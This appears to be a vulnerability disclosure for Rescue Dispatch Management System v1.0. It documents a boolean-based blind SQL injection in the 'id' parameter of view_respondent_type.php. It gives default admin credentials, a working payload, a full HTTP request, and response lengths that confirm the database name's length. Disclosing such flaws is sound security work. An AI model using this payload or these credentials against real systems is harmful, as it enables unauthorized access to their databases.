# Rescue Dispatch Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15296/rescue-dispatch-management-system-phpoop-free-source-code.html

Vulnerability File:  rdms/admin/respondent_types/view_respondent_type.php?id=

Vulnerability location: /rdms/admin/respondent_types/view_respondent_type.php?id=,id

[+] Payload: /rdms/admin/respondent_types/view_respondent_type.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id

Current database name: rdms_db,length is 7

```sql
GET /rdms/admin/respondent_types/view_respondent_type.php?id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=hkbchcmaitn0d8enhm4jtdjk9q
Connection: close
```

When length (database ()) = 6, Content-Length: 799
![image](https://user-images.githubusercontent.com/54017627/170463788-4e58e028-d7cc-429f-abd4-cf63a3ce57d3.png)

![image](https://user-images.githubusercontent.com/54017627/170463537-066d3e04-e215-4a28-a8c4-6c1adf0d97b1.png)

When length (database ()) = 7, Content-Length: 653
![image](https://user-images.githubusercontent.com/54017627/170463756-1c758ebf-39e5-4f26-8695-d7e46aca6bc4.png)

![image](https://user-images.githubusercontent.com/54017627/170463484-72f66ab9-b4a3-4c7e-8be6-2ed41751e377.png)
